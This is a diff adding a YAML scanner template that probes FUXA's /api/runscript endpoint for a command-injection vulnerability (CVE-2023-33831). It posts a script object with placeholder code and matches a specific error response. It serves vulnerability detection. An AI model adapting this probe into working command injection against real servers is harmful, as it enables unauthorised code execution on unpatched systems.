@@ -1,0 +1,48 @@
+id: poc-yaml-fuxa-runscript-rce
+info:
+  name: Fuxa Command Injection Vulnerability (CVE-2023-33831)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection,CVE-2023-33831
+http:
+  - method: POST
+    path:
+      - "/api/runscript"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "headers": {
+            "normalizedNames":{},
+            "lazyUpdate": "null"
+        },
+        "params":{
+            "script":{
+                "parameters":[{
+                    "name":"aaaa",
+                    "type":"tagid",
+                    "value":""
+                }],
+                "mode":"",
+                "id":"",
+                "test":"true",
+                "name":"ok",
+                "outputId":"",
+                "code":"aaa"
+            }
+        }
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        part: header
+        words:
+          - "ETag"
+      - type: word
+        part: body
+        words:
+          - "\"error\":\"unexpected_error\""
+          - "TypeError: console.error is not a function"
